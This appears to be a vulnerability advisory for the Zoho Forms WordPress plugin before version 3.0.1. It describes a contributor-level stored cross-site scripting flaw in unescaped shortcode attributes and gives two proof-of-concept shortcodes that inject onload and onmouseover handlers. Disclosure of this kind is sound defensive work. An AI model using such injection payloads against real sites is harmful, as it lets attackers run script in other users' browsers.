## WordPress Plugin Vulnerabilities

# Zoho Forms < 3.0.1 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.

### Proof of Concept

As a contributor, put the following in a blog post, and preview it:
[zohoForms src='" onload="alert(1)"']
[zohoForms src='http://localhost/" onmouseover="alert(1)"']
